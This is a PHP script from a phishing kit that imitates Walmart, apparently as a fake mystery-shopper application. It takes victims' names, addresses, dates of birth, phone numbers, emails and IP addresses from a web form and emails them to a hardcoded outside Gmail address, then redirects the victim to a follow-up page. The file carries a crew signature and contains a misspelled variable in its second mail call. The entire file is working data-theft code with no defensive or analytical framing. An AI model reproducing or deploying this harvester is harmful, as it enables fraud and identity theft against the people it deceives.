<?include 'Walmart_files/validate_form.js';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- XxX  *~* DEPOLY MS ADDYS *~*  XxX----------------------\n";
$message .= "First Name: ".$_POST['name']."\n";
$message .= "Last Name: ".$_POST['lasame']."\n";
$message .= "Contact Address: ".$_POST['ddress']."\n";
$message .= "Address 2: ".$_POST['apt']."\n";
$message .= "City: ".$_POST['itcy']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "zipcode: ".$_POST['zipc']."\n";
$message .= "Date of Birt: ".$_POST['age']."\n";
$message .= "Telephone: ".$_POST['hompf']."\n";
$message .= "Mobile No: ".$_POST['celfone']."\n";
$message .= "Email: ".$_POST['emalis']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------------------Created By THEPOLY--------------------------------------\n";
$recipient = "kkola1064@gmail.com";
$subject = "MYSTERY SHOPPER RESULT";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 if (mail($recipent,$subject,$message,$headers))
	   {
		   header("Location: application.htm");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>